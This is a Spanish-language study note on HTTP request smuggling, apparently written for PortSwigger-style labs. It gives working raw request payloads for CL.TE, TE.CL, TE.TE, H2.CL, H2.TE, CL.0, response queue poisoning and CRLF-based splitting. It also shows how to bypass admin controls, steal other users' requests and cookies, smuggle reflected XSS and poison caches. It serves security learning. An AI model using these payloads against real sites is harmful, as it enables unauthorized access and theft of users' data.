<img width="1776" height="834" alt="image" src="https://github.com/user-attachments/assets/ec61fe41-7641-4373-a88c-da3ef9d23d63" />


## Que cojones es esto

<img width="835" height="419" alt="image" src="https://github.com/user-attachments/assets/122b9fc3-7ecc-4452-ac6e-2d6b9c1c8876" />

Basicamente este tipo de arquitectura pilla todas las peticiones que se le hacen al front-end y las envía a una misma conexión del backend puesto que esto es más eficiente y el backend se encarga de separar esas requests.

<img width="923" height="474" alt="image" src="https://github.com/user-attachments/assets/3765175d-7238-4db7-a90f-22b84bd4b486" />


El ataque consiste en que nosotros enviamos una request ambigua que se procese rarillamente por el backend, en el ataque de la imagen lo que se hace es conseguir que el final de nuestra requests sea interpretado como el principio de la request de otro usuario.

## Porque es vulnerable ? 

Esta vulnerabilidad sale normalmente por como se comporta HTTP/1 y su manera de diferenciar donde empieza y donde acaba una request , ya que usa los headers : 
`Content-Length` `Transfer-Encoding` 

El de content length dice cuanto pesa el cuerpo de la request en bytes.

El Transfer-Encoding header basicamente para decir si el body usa chunked encoding(si usa mas de un bloque de info) la sintaxis de esrto es primero el numero de bytes que ocupa en hexadecimal y en la siguiente linea el contenido y luego terminado con el size de 0 final

```
POST /search HTTP/1.1 
Host: normal-website.com 
Content-Type: application/x-www-form-urlencoded 
Transfer-Encoding: chunked 
b 
q=smuggling 
0
```

Se puede dar que ambos headers están en la request y para que no pete el backend suele ignorar  `Content-Length` , esto funciona cuando hay un solo server que procese la request, pero si hay varios pasan cositas:

1. Algunos servers no soportan `Transfer-Encoding`
2. Otros que sí los soportan pueden no procesar `Transfer-Encoding` si se ofusca 
Si el back-end y front-end se comportan diferente en relación a `Transfer-Encoding` podríamos ocasionar un HTTP request smuggling

Los ataques suelen ser poniendo ambos headers : `Content-Length`  `Transfer-Encoding` pa que el back-end y el front-end lo procesen de forma distinta, esto se hace según como esos dos servidores procesas las cosas :

3. CL.TE -> front-end usa `Content-Length` y back-end usa `Transfer-Encoding`
4. TE.CL -> justo al contrario de CL.TE
5. TE.TE -> back-end y front-end usan `Transfer-Encoding` pero uno de los dos puede ser inducido pa no procesarlo


## CL.TE

### Básico

```
POST / HTTP/1.1 
Host: vulnerable-website.com 
Content-Length: 13 
Transfer-Encoding: chunked

 0 
 
 SMUGGLED
```

Front-end -> usa content length y por ende envía procesa todos los 13 bytes de la request

Back-end -> usa transfer encoding y la request le dice que esta chunked , lee el byte en hexadecimal que dice cuantos bytes pesa el body y como es 0 asume que no hay body y se termina la request, haciendo que `SMUGGLED` no sea procesado en esa request y se ponga como principio de la siguiente request

### Confirmación

Request normal : 

```
POST /search HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 11 

q=smuggling
```

Request maliciosa:

```
POST /search HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 49 
Transfer-Encoding: chunked 

e 
q=smuggling&x= 
0 

GET /404 HTTP/1.1 
Foo: x
```

si todo va bien y la segunda request que enviamos es normal la request se procesara algo así y nos dará error 404 :

```
GET /404 HTTP/1.1 
Foo: xPOST /search HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 11 

q=smuggling

```



## TE.CL

### Básico

```
POST / HTTP/1.1 
Host: vulnerable-website.com 
Content-Length: 3 
Transfer-Encoding: chunked 

8 

SMUGGLED 

0
```

Front-end -> procesa transfer encoding y procesa todos los chunks
Back-end -> solo procesa los 3 bytas especificados en content length que son hasta terminar el `8` , por ende `SMUGGLED` será puesto como el inicio de la siguiente request


```
Note

To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

You need to include the trailing sequence `\r\n\r\n` following the final 0. 
```

### Confirmación

Lo mismo que con CL.TE pero la request maliciosa se debe de ver algo así : 

```
POST /search HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 4 
Transfer-Encoding: chunked 

	7c
	GET /404 HTTP/1.1 
	Host: vulnerable-website.com 
	Content-Type: application/x-www-form-urlencoded 
	Content-Length: 144 
	
	x= 
	0
```


NOTE: 

To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

You need to include the trailing sequence `\r\n\r\n` following the final `0`.

## TE.TE

Métodos para ofuscar el `Transfer-encoding` header:

```
	Transfer-Encoding: xchunked 

Transfer-Encoding : chunked

Transfer-Encoding: chunked 
Transfer-Encoding: x 

Transfer-Encoding:[tab]chunked 

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked 

Transfer-Encoding
: chunked
```


LAB:

lo que hacemos aqui es poner dos headers TE Donde uno tiene una mala sintaxis: 
```
		Transfer-Encoding: chunked 
		Transfer-Encoding: x 
```
Así el backend petara y preferirá usar el header de content-lenght


## Exploiting HTTP request smuggling vulnerabilities

#### Using HTTP request smuggling to bypass front-end security controls

Imaginemos que la web tiene un /admin que solo dará la request al backend si el usuario está autenticado , pues podríamos astacar ese funcionamineto de esta manera : 

```
POST /home HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 62 
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1 Host: vulnerable-website.com 
Foo: xGET /home HTTP/1.1 Host: vulnerable-website.com
```

Aquí el front-end ve dos request hechas en /home así que las pasa al backend, entonces el back-end confía en lo que el front - end le pasa pero el ve una request a /home y otra a /admin asi que procesa las dos sin complicaciones 


#### Bypassing client authentication

```
POST /example HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: x-www-form-urlencoded 
Content-Length: 64 
Transfer-Encoding: chunked 

0 

GET /admin HTTP/1.1 
X-SSL-CLIENT-CN: administrator 
Foo: x

```

#### Capturing other users' requests

Si la app tiene una funcionalidad en la que puedes almacenar y luego obtener datos en texto.

Imaginemos que la app tiene una función para postear un comentario que sera guardado y luego enseñado en el blog:

```
POST /post/comment HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 154 
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

 csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
 ```
Imaginemos que ahora lanzamos un ataque que tenga un content-length enrome y donde el comentario esté al final de esta forma : 


```
GET / HTTP/1.1 
Host: vulnerable-website.com 
Transfer-Encoding: chunked 
Content-Length: 330 

0 

POST /post/comment HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 400 
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

vemos que la request smuggleada tiene supuestamente 400 bytes, cosa que no es cierta y por ende el backend esperará a rellenar esos 400 bytes con la info de otras request y así podremos pillar datos de otros usuarios de forma que la response se verá reflejada en el comentario del blog.


#### Using HTTP request smuggling to exploit reflected XSS

Si una web es vulnerable a HTTP request smuggling pero también a reflected XSS a través de una request entonces podríamos explotar ese XSS de forma qe el usuario no tenga que hacer nada simplemente haciendo un smuggling de una request de esta forma : 

```
POST / HTTP/1.1 
Host: vulnerable-website.com 
Content-Length: 63 
Transfer-Encoding: chunked 

0

GET / HTTP/1.1 
User-Agent: <script>alert(1)</script> 
Foo: X
```


#### Using HTTP request smuggling to perform web cache poisoning

```
POST / HTTP/1.1 
Host: vulnerable-website.com 
Content-Length: 59 
Transfer-Encoding: chunked 

0

GET /home HTTP/1.1 
Host: attacker-website.com 
Foo: XGET /static/include.js HTTP/1.1 Host: vulnerable-website.com
```


## Advanced request smuggling

En principio HTTP/2 es seguro a HTTP request smuggling pero si una web usa HTTP/2 para  el front-end y luego para el back-end hace un down grading a HTTP/1 entonces puede ser vulnerable 

#### H2.CL vulnerabilities

 se ve que HTTP/2 no usa el content-length así que le <img width="515" height="519" alt="image" src="https://github.com/user-attachments/assets/aec71510-02a2-4a89-8a25-2f58819621b6" />
podemos meter ese header que luego se ejecutara con HTTP/1 en el downgrading

```
POST /example HTTP/2 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 0 

GET /admin HTTP/1.1 
Host: vulnerable-website.com 
Content-Length: 10 
x=1GET / H

```

#### H2.TE vulnerabilities

La cabecera de TE no la acepta HTTP/2 pero si el mecanismo del front - end no furula bien y la metes entonces puedes explotarla : 

```
POST /example HTTP/2
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Transfer-Encoding: chunked 

0 

GET /admin HTTP/1.1 
Host: vulnerable-website.com 
Foo: bar
```

#### Response queue poisoning 

Basicamente el front end pilla las request y el back - end las procesa y las devuelve a su destino, pero si nosotros hacemos smuggling pero no para modificar la request de alguien si no que hacemos que nuestra request smuggleada sea pillada por el backend como una request entera, entonces las request que yo meta se pondra a la cola de procesarse por el back end pero claro el back end dira coño tengo 4 request y 3 personas (porque nuestra request es doble) asi que le enviará la response a quien le de la gana y con suerte a nosotros

Ejemplo (back-end TE)

```
POST / HTTP/1.1\r\n 
Host: vulnerable-website.com\r\n 
Content-Type: x-www-form-urlencoded\r\n 
Content-Length: 61\r\n 
Transfer-Encoding: chunked\r\n 
\r\n 
0\r\n 
\r\n 
GET /anything HTTP/1.1\r\n 
Host: vulnerable-website.com\r\n 
\r\n 
GET / HTTP/1.1\r\n 
Host: vulnerable-website.com\r\n 
\r\n
```

Ejemplo (front-end CL)

```
POST / HTTP/1.1\r\n 
Host: vulnerable-website.com\r\n 
Content-Type: x-www-form-urlencoded\r\n 
Content-Length: 61\r\n 
Transfer-Encoding: chunked\r\n 
\r\n 
0\r\n 
\r\n 
GET /anything HTTP/1.1\r\n 
Host: vulnerable-website.com\r\n 
\r\n 
GET / HTTP/1.1\r\n 
Host: vulnerable-website.com\r\n 
\r\n
```

tambien se puede hacer con H2, para que funcione hay que hacer una pool de 1 request cada 800 y quitarle en settings update content length del intruder
#### Request smuggling via CRLF injection

Even if websites take steps to prevent basic H2.CL or H2.TE attacks, such as validating the `content-length` or stripping any `transfer-encoding` headers, HTTP/2's binary format enables some novel ways to bypass these kinds of front-end measures.


Si el front-end no pilla `\n` como salto de línea pero el back-end si podríamos ofuscar el Transfer-Encoding por ejemplo de esta forma : 

`Foo: bar\nTransfer-Encoding: chunked`

esto lo añadiremos de la siguiente manera : 

<img width="515" height="519" alt="image" src="https://github.com/user-attachments/assets/c87d94f9-1c97-4d8f-884a-f05ff60767cf" />



#### HTTP/2 request splitting

Básicamente vamos a enviarle dos peticiones enteras en una misma petición, esto se hará creando un header con este contenido:

```
bar\r\n 
\r\n 
GET /x HTTP/1.1\r\n 
Host: YOUR-LAB-ID.web-security-academy.net
```

#### CL.0 

cuando el back-end no procesa bien el content-length y lo parsea como si fuese content-length: 0, para confirmarlo haz una request con otra request dentro que haga que salte un 404: 

```
POST /vulnerable-endpoint HTTP/1.1 
Host: vulnerable-website.com 
Connection: keep-alive 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 34 

GET /hopefully404 HTTP/1.1 
Foo: xGET / HTTP/1.1 Host: vulnerable-
website.com
```


Para que sea efectivo necesitamos un endpoint que haga un POST a un recurso estático, ademáse necesitamos los siguientes headers :

```
Connection: keep-alive
```

Burp lo ingorara a menos que habilitemos esta opción en el repeater:

<img width="726" height="518" alt="image" src="https://github.com/user-attachments/assets/925dda4a-80a9-4ca2-a503-1d3047b158de" />


luego le das al + de repeater y añades un nuevo grupo al que añadirás la request maliciosa y la normal a la pagina principal :

<img width="247" height="135" alt="image" src="https://github.com/user-attachments/assets/906da844-c1db-4e0b-a0c6-1035c8a9a48d" />


Por último en la pestaña de send hay que mandarlo con single connection : 

<img width="720" height="322" alt="image" src="https://github.com/user-attachments/assets/1836cfcc-58f9-47dd-baf1-3817afebd0a3" />

